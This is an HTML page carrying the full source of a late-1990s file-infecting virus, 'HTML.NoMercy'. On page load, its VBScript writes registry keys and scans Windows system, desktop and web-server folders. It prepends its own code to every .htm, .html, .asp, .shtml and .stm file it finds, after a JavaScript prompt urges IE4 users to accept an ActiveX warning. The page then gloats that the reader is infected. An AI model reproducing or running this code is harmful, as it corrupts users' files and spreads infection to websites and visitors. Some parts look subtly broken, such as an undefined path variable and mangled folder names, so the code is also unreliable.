<META NAME=Author CONTENT=foxz of NoMercyVirusTeam>
<html><body>
<SCRIPT Language = "JavaScript">
<!--
//first detect the browser, if not IE4 let user know
//that IE4 good :) (yeach for our infection of coz) 
	var userAgent=navigator.appName;
	var userVer=navigator.appVersion;
//detect 1st char of detected browser
	var agentInfo=userAgent.substring(0, 1);
//detect 1st char of detected browser
	var agentVer=userVer.substring(0, 1);
//If 1st char = M indicate to Microsoft
       if(agentInfo == "M"){
//make sure user use version 4 of IE
if  (agentVer =="4"){
//run ugly message box, we begging on user :(
alert("IF Your Active-X ask to you, and you want \nto continue load this page answer YES!")
}
}else {
     //Non-IE4 detected let user know that his browser suck ;p
     //this warning work even on Web-TV, i have test with Web-TV
     //browser emulator. get it on http://www.webtv.com
alert("Thet page you wanna see was design ONLY for IE4, \ni'm really sorry about this ")
self.close()
}
//-->
</SCRIPT>

<script Language="VBScript">
<!-- HTML.NoMercy.A done by foxz of NoMercyVirusTeam -->
<!-- Greeting to: Knowdeth, Crazh, Slage, Asmhead, nUc, _rod_, SK, Kypo, Vic -->
<!-- this will not run on Netscape -->
<!--
On Error Resume Next
Set WshShell = CreateObject("WScript.Shell")
WshShell.RegWrite "HKEY_LOCAL_MACHINE\Infected\With\Name", "HTML.NoMercy"
WshShell.RegWrite "HKEY_LOCAL_MACHINE\Infected\With\Author", "foxz of NVT"
WshShell.RegWrite "HKEY_LOCAL_MACHINE\Infected\With\Team", "TheNoMercyVirusTeam"
WshShell.RegWrite "HKEY_LOCAL_MACHINE\Infected\With\URL", "http://sourceofkaos.com/homes/nomercy"

If Day(Now()) = 13 or Day(Now()) = 30 Then
Message_Text   = "God, why you did it to me"
Title_Text     = "||HTML.NoMercy||"
    intDoIt =  MsgBox(Message_Text, _
                      vbOKOnly + vbInformation,    _
                      Title_Text)
  End If
if location.protocol = "file:" then
 	Set FSO = CreateObject("Scripting.FileSystemObject")
	Path = Replace(location.href, "/", "\")
	Path = Replace(HPath, "file:\\\", "")
	Path = FSO.GetParentFolderName(HPath)
	Set TRange = document.body.createTextRange
	Call GetFolder(Path)
	Call GetFolder("C:\")
	Call GetFolder("C:\temp")
	Call GetFolder("C:\My Documents")
	Call GetFolder("C:\Windows\Desktop")
	Call GetFolder("C:\Windows\Web")
	Call GetFolder("C:\Windows\Web\Wallpaper")
	Call GetFolder("C:\Windows\Help")
	Call GetFolder("C:\Windows\Temp")
	Call GetFolder("C:\Windows\ShellNew")
	Call GetFolder("C:\Windows\System")
	Call GetFolder("C:\Windows")
	Call GetFolder("C:\Winnt\Desktop")
	Call GetFolder("C:\Winnt\Web")
	Call GetFolder("C:\Winnt\Web\Wallpaper")
	Call GetFolder("C:\Winnt\Help")
	Call GetFolder("C:\Winnt\Temp")
	Call GetFolder("C:\Winnt\ShellNew")
	Call GetFolder("C:\Winnt\System")
	Call GetFolder("C:\Winnt")
	Call GetFolder("C:\Program Files\Internet Explorer\Connection Wizard")
	Call GetFolder("C:\Program Files\Microsoft FrontPage\bin")
	Call GetFolder("C:\Program Files\Macromedia\Flash 3")
	Call GetFolder("C:\Program Files\Macromedia\Flash 3\Help")
	Call GetFolder("C:\Program Files\Macromedia\Flash 3\Help\html")
	Call GetFolder("C:\Program Files\Macromedia\Flash 3\Help\html\80SampleSite")
	Call GetFolder("C:\Program Files\sambar41\sysadmin")
	Call GetFolder("C:\Program Files\Microsoft Office\Office\Headers")
	Call GetFolder("C:\Inetpub\wwwroot")
	Call GetFolder("C:\Inetpub\wwwroot\myweb")
	Call GetFolder("C:\webshare\wwwroot")
	Call GetFolder("C:\webshare\wwwroot\myweb")	
  end if
Sub GetFolder(InfPath)
On Error Resume Next
if FSO.FolderExists(InfPath) then
	Do
	 Set FolderObj = FSO.GetFolder(InfPath)
	 InfPath = FSO.GetParentFolderName(InfPath)
	 Set FO = FolderObj.Files
	 For each target in FO
		ExtName = lcase(FSO.GetExtensionName(target.Name))
		if ExtName = "asp" or ExtName = "shtml" or ExtName = "stm" or ExtName = "htm" or ExtName = "html" then
			Set Real = FSO.OpenTextFile(target.path, 1, False)
		if Real.readline <> "<META NAME=Author CONTENT=foxz of NoMercyVirusTeam>" then
				Real.close()
				GetFile(target.path)
			else
				Real.close()
			end if
		end if
	 next
	Loop Until FolderObj.IsRootFolder = True
end if
End Sub

Sub GetFile(GetFileName)
	Set Real = FSO.OpenTextFile(GetFileName, 1, False)
	FileContents = Real.ReadAll()
	Real.close()
	Set Real = FSO.OpenTextFile(GetFileName, 2, False)
	Real.WriteLine "<META NAME=Author CONTENT=foxz of NoMercyVirusTeam>"
	Real.Write("<html><body>" + Chr(13) + Chr(10))
	Real.WriteLine TRange.htmlText
	Real.WriteLine("</body></html>")
	Real.Write(FileContents)
	Real.close()
End Sub

-->
</script>
<html>
<head>
   <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
   <meta name="Author" content="test">
   <meta name="GENERATOR" content="Mozilla/4.51 [en] (Win98; I) [Netscape]">
   <title>HTML.NoMercy</title>
</head>
<body>
<font face="Arial,Helvetica"><font size=-2>Name: HTML.NoMercy</font></font>
<br><font face="Arial,Helvetica"><font size=-2>Author: foxz of NoMercyVirusTeam</font></font>
<br><font face="Arial,Helvetica"><font size=-2>Base on: HTML.Reality (KD werk)</font></font>
<br><font face="Arial,Helvetica"><font size=-2>dedicate: to my sweet honey " dont worry i'm not mad"
<br><font face="Arial,Helvetica"><font size=-2>Browser warning:yes, self close if not IE4/font></font>
<br><font face="Arial,Helvetica"><font size=-2>On run infect to:</font></font>
<center><table BORDER=0 CELLSPACING=0 CELLPADDING=0 COLS=2 WIDTH="610" >
<tr>
<td><font face="Arial,Helvetica"><font size=-2>C:\temp</font></font>
<br><font face="Arial,Helvetica"><font size=-2>C:/Documents%20and%20Settings/Snakema/My%20Document</font></font>
<br><font face="Arial,Helvetica"><font size=-2>C:/Documents%20and%20Settings/All%20Users/Deskto</font></font>
<br><font face="Arial,Helvetica"><font size=-2>C:\Windows\Web</font></font>
<br><font face="Arial,Helvetica"><font size=-2>C:\Windows\Web\Wallpaper</font></font>
<br><font face="Arial,Helvetica"><font size=-2>C:\Windows\Help</font></font>
<br><font face="Arial,Helvetica"><font size=-2>C:\Windows\Temp</font></font>
<br><font face="Arial,Helvetica"><font size=-2>C:\Windows\ShellNew</font></font>
<br><font face="Arial,Helvetica"><font size=-2>C:\Windows\System</font></font>
<br><font face="Arial,Helvetica"><font size=-2>C:\Windows</font></font>
<br><font face="Arial,Helvetica"><font size=-2>C:\Winnt\Desktop</font></font>
<br><font face="Arial,Helvetica"><font size=-2>C:\Winnt\Web</font></font>
<br><font face="Arial,Helvetica"><font size=-2>C:\Winnt\Web\Wallpaper</font></font>
<br><font face="Arial,Helvetica"><font size=-2>C:\Winnt\Help</font></font>
<br><font face="Arial,Helvetica"><font size=-2>C:\Winnt\Temp</font></font></td>

<td><font face="Arial,Helvetica"><font size=-2>C:\Winnt\ShellNew</font></font>
<br><font face="Arial,Helvetica"><font size=-2>C:\Winnt\System</font></font>
<br><font face="Arial,Helvetica"><font size=-2>C:\Winnt</font></font>
<br><font face="Arial,Helvetica"><font size=-2>C:\Program Files\Internet
Explorer\Connection Wizard</font></font>
<br><font face="Arial,Helvetica"><font size=-2>C:\Program Files\Microsoft
FrontPage\bin</font></font>
<br><font face="Arial,Helvetica"><font size=-2>C:\Program Files\Macromedia\Flash
3</font></font>
<br><font face="Arial,Helvetica"><font size=-2>C:\Program Files\Macromedia\Flash
3\Help</font></font>
<br><font face="Arial,Helvetica"><font size=-2>C:\Program Files\Macromedia\Flash
3\Help\html</font></font>
<br><font face="Arial,Helvetica"><font size=-2>C:\Program Files\Macromedia\Flash
3\Help\html\80SampleSite</font></font>
<br><font face="Arial,Helvetica"><font size=-2>C:\C:\Program Files\sambar41\sysadmin</font></font>
<br><font face="Arial,Helvetica"><font size=-2>C:\Program Files\Microsoft
Office\Office\Headers</font></font>
<br><font face="Arial,Helvetica"><font size=-2>C:\Inetpub\wwwroot</font></font>
<br><font face="Arial,Helvetica"><font size=-2>C:\Inetpub\wwwroot\myweb</font></font>
<br><font face="Arial,Helvetica"><font size=-2>C:\webshare\wwwroot</font></font>
<br><font face="Arial,Helvetica"><font size=-2>C:\webshare\wwwroot\myweb</font></font></td>
</tr>
</table></center>

<br>&nbsp;
<center><table BORDER=0 CELLSPACING=0 CELLPADDING=0 COLS=1 WIDTH="610" BGCOLOR="#FF0000" >
<tr>
<td>
<center><b><font face="Arial,Helvetica"><font size=+2>DONT BLAME ME :)&nbsp;</font></font></b>
<br><b><font face="Arial,Helvetica"><font color="#FFFFFF"><font size=+2>You
read the HTML version,&nbsp;</font></font></font></b>
<br><b><font face="Arial,Helvetica"><font size=+2>hehehe you was infected
;p</font></font></b></center>
</td>
</tr>
</table></center>

<br>&nbsp;
</body>
</html>
